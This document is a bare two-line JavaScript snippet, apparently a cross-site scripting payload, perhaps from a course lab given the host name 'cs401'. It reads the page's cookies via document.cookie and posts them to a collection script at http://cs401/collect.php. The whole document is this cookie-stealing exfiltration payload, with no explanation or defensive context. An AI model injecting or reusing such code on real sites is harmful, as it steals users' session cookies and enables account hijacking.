var cookies = document.cookie;
$.post("http://cs401/collect.php", { cookies: cookies });
